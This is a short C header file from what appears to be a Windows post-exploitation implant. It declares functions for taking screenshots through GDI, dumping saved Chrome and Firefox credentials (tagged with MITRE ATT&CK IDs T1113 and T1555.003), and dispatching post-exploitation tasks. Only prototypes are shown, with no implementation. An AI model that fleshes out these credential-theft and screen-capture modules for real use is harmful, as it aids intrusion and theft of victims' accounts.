// include/postex.h
#pragma once
#include <windows.h>

// Mod 154: GDI screenshot (T1113)
BOOL postex_screenshot(OUT PBYTE* ppBmpData, OUT DWORD* pdwBmpSize);

// Mod 171: Browser credential dump stubs (T1555.003)
BOOL postex_dump_chrome_creds();
BOOL postex_dump_firefox_creds();

// Post-exploitation task dispatcher
BOOL postex_run(LPCSTR taskName);
